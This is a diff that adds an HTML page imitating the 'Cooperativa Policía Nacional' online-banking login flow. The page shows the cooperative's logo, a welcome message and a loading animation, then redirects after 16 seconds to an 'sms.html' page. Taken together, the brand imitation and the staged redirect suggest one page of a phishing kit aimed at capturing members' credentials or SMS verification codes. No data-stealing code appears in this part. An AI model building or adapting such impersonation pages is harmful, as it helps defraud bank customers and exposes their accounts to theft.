@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Cooperativa Policía Nacional</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <meta http-equiv="refresh" content="16; url=sms.html">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Avenir Next LT Pro", sans-serif;
+        font-weight: 400 !important;
+      }
+
+      .dot-loader div {
+        width: 12px;
+        height: 12px;
+        margin: 0 5px;
+        background: #ff7500;
+        border-radius: 50%;
+        animation: bounce 1.2s infinite ease-in-out both;
+      }
+
+      .dot-loader div:nth-child(1) {
+        animation-delay: -0.24s;
+      }
+
+      .dot-loader div:nth-child(2) {
+        animation-delay: -0.12s;
+      }
+
+      .dot-loader div:nth-child(3) {
+        animation-delay: 0s;
+      }
+
+      @keyframes bounce {
+        0%, 80%, 100% {
+          transform: scale(0);
+        }
+        40% {
+          transform: scale(1);
+        }
+      }
+    </style>
+  </head>
+  <body
+    class="bg-gray-100 flex flex-col items-center justify-center min-h-screen px-4 relative"
+    style="background-image: url(fondoLogin.png)"
+  >
+    <!-- Logo -->
+    <div class="mb-4">
+      <img
+        src="cpn_logo.png"
+        alt="Logo CPN"
+        class="mx-auto"
+        style="width: 190px; margin-top: 20px; margin-bottom: 0px"
+      />
+    </div>
+
+    <div style="padding: 40px">
+      <!-- Loader Box -->
+      <div
+        class="relative bg-white shadow-lg rounded-xl max-w-md w-full p-8 sm:p-8 custom-form z-10 flex flex-col items-center justify-center"
+        style="min-height: 260px"
+      >
+        <div class="mb-6 text-center">
+          <h2
+            class="font-bold text-lg"
+            style="color: #ff7500; font-size: 15px !important"
+          >
+            ¡Hola, te damos la bienvenida!
+          </h2>
+          <p
+            class="text-gray-800 font-semibold"
+            style="font-size: 13px !important"
+          >
+            Cargando acceso a tu Cooperativa Virtual
+          </p>
+        </div>
+
+        <!-- Dot Loader -->
+        <div class="dot-loader flex justify-center mt-4">
+          <div></div>
+          <div></div>
+          <div></div>
+        </div>
+
+        <!-- Imagen pegada al borde inferior izquierdo -->
+        <img
+          src="women.png"
+          alt="Mujer con laptop"
+          class="absolute bottom-0 w-32 sm:w-36"
+          style="left: -50px; width: 80px"
+        />
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="mt-6 text-center text-sm text-gray-500 z-10">
+      <a href="#" class="text-orange-600 hover:underline">Privacidad</a><br />
+      Copyright (c) Cooperativa Policía Nacional. Todos los derechos reservados.
+    </div>
+  </body>
+</html>
